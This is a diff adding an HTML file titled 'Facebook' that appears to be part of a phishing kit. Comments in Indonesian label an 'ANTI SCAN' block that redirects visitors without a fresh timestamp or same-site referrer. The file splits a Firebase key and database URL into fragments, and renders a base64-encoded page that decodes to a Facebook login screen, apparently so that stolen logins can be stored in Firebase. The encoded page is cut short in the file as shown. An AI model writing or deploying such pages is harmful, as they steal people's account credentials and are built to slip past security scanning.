@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>f</text></svg>">
+    
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #f0f2f5;
+        }
+        #content { display: none; }
+    </style>
+</head>
+<body>
+    <div id="content"></div>
+
+    <script>
+        // ═══════════════════════════════════════
+        // ANTI SCAN - Konten di-load dari memory
+        // ═══════════════════════════════════════
+        
+        // Verifikasi user asli
+        var urlParams = new URLSearchParams(window.location.search);
+        var timestamp = urlParams.get('t');
+        var now = Date.now();
+        
+        // Kalau ga ada timestamp atau > 5 detik, redirect
+        if (!timestamp || (now - parseInt(timestamp)) > 5000) {
+            window.location.href = 'index.html';
+        }
+        
+        // Cek referrer
+        if (!document.referrer.includes(window.location.hostname)) {
+            window.location.href = 'index.html';
+        }
+        
+        // ═══════════════════════════════════════
+        // FIREBASE (config terpecah)
+        // ═══════════════════════════════════════
+        var _k = [
+            'AIzaSyBs9TiMKOoMaIb84RVowQFrGlELAZ',
+            '_SFSI',
+            'rhfzero-d95f5.firebaseapp.com',
+            'https://rhfzero-d95f5-default-rtdb.firebaseio.com',
+            'rhfzero-d95f5',
+            'rhfzero-d95f5.firebasestorage.app',
+            '198495096060',
+            '1:198495096060:web:d368e1531d0d86321f5b79'
+        ];
+        
+        firebase.initializeApp({
+            apiKey: _k[0] + _k[1],
+            authDomain: _k[2],
+            databaseURL: _k[3],
+            projectId: _k[4],
+            storageBucket: _k[5],
+            messagingSenderId: _k[6],
+            appId: _k[7]
+        });
+        
+        // ═══════════════════════════════════════
+        // RENDER CONTENT (dari encoded string)
+        // ═══════════════════════════════════════
+        var _html = '';
+        _html += 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPG1ldGEgY2hhcnNldD0iVVRGLTgiPg';
+        _html += 'o8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLC';
+        _html += 'Bpbml0aWFsLXNjYWxlPTEuMCI+Cjx0aXRsZT5GYWNlYm9vayAtIExvZyBJbiBvciBTaW';
+        
+        // Decode & render
+        function renderPage() {
+            var container = document.getElementById('content');
+            container.innerHTML = decodeURIComponent(escape(atob(_html)));
+            container.style.display = 'block';
+        }
+        
+        // Render setelah verifikasi
+        setTimeout(renderPage, 300);
+    </script>
+</body>
+</html>
